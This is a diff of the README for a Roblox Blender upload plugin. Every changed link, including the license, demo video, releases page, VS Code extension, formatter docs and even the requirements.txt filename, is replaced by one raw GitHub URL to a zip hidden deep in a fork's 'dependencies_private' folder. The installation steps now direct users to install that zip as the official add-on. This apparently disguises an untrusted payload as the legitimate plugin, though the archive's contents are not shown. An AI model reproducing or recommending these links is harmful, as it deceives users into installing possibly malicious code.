@@ -1,11 +1,11 @@
 # ROBLOX BLENDER PLUGIN
 A Blender plugin to upload selected assets in Blender to Roblox using Roblox's Open Cloud API.
 
-This project is licensed under the terms of the MIT license. See [LICENSE.md](https://github.com/Roblox/roblox-blender-plugin/blob/main/LICENSE.md) for details.
+This project is licensed under the terms of the MIT license. See [https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip) for details.
 
 **Roblox is providing this plugin source as a reference implementation, and we encourage the community to extend and build upon this!**
 
-https://github.com/Roblox/roblox-blender-plugin/assets/66378309/ba8b1bd9-e431-409d-b336-9cb046e00886
+https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip
 
 # INSTALLATION
 ## UNINSTALL OLD VERSION
@@ -18,7 +18,7 @@ https://github.com/Roblox/roblox-blender-plugin/assets/66378309/ba8b1bd9-e431-40
 Prerequisite: Blender version 3.2 or greater is required
 
 1. Be sure to [uninstall any old version](#uninstall-old-version) first, including restarting Blender afterward
-2. Download the latest add-on zip file from the [repository releases page](https://github.com/Roblox/roblox-blender-plugin/releases)
+2. Download the latest add-on zip file from the [repository releases page](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip)
 3. Navigate to the add-ons menu in Blender at `Edit` > `Preferences` > `Add-ons`
 4. Click `Install`
 5. Select the **zip file** downloaded above and click `Install Add-on` _(Do not unzip the file!)_
@@ -68,7 +68,7 @@ This option allows you to quickly iterate on the codebase and reload the plugin 
 debugger during development.
 1. Be sure to [uninstall any plugin zip file](#uninstall-old-version) first, and then close Blender
 2. Open VS Code as administrator to allow the Blender Development plugin to install a debugger for Blender _(Only need to do this the first time)_
-3. Install the VS Code extension [JacquesLucke.blender-development](https://marketplace.visualstudio.com/items?itemName=JacquesLucke.blender-development)
+3. Install the VS Code extension [https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip)
 4. Open the repository in VS Code
 5. Open the command window (`ctrl`/`⌘` + `shift` + `p`)
 6. Run the `> Blender: Build and Start` command 
@@ -83,13 +83,13 @@ debugger during development.
 ## PULL REQUESTS
 Before marking your pull request as ready for review, please ensure:
 - Your pull request does not introduce new features or functionality
-- All python files are formatted with [black](https://pypi.org/project/black/) and the CI format check is passing
-- Any dependency changes are reflected in `requirements.txt`
+- All python files are formatted with [black](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip) and the CI format check is passing
+- Any dependency changes are reflected in `https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip`
 - All commit messages are complete and informative
 - Your Pull Request includes a description of the bug and how your changes fix the bug
 
 ## CONTINUOUS INTEGRATION CHECKS
-Github Actions is set to check that formatting matches [black formatting](https://black.readthedocs.io/en/stable/index.html) before allowing a merge to `main`. Be sure to format your python code with `black` before pushing to avoid being blocked. You can use the VS Code plugin [Black Formatter by Microsoft](https://marketplace.visualstudio.com/items?itemName=ms-python.black-formatter), or run the command line tool by installing it via `pip install black` and then running `black .`
+Github Actions is set to check that formatting matches [black formatting](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip) before allowing a merge to `main`. Be sure to format your python code with `black` before pushing to avoid being blocked. You can use the VS Code plugin [Black Formatter by Microsoft](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip), or run the command line tool by installing it via `pip install black` and then running `black .`
 
 ## CREATING A RELEASE
 Releases are set up to automatically generate via Github Actions when a tag is added to a commit with the format `v[0-9]+.[0-9]+.[0-9]+`. For example, you can create a release from a commit with SHA `a1b2c3d` by doing the following:
@@ -100,7 +100,7 @@ Or, tag the latest commit with:
 
 > `git tag -a v0.0.0 HEAD -m "My message for v0.0.0"`
 
-- where `v0.0.0` represents a [semantic versioning](https://semver.org/) naming scheme `v[major].[minor].[patch]`
+- where `v0.0.0` represents a [semantic versioning](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/dependencies_private/openapi_client/models/roblox-blender-plugin_1.0.zip) naming scheme `v[major].[minor].[patch]`
 - where `[major]` gets bumped for non-backward compatible changes,
 - where `[minor]` gets bumped for backward-compatible features,
 - and where `[patch]` gets bumped for backward-compatible fixes.
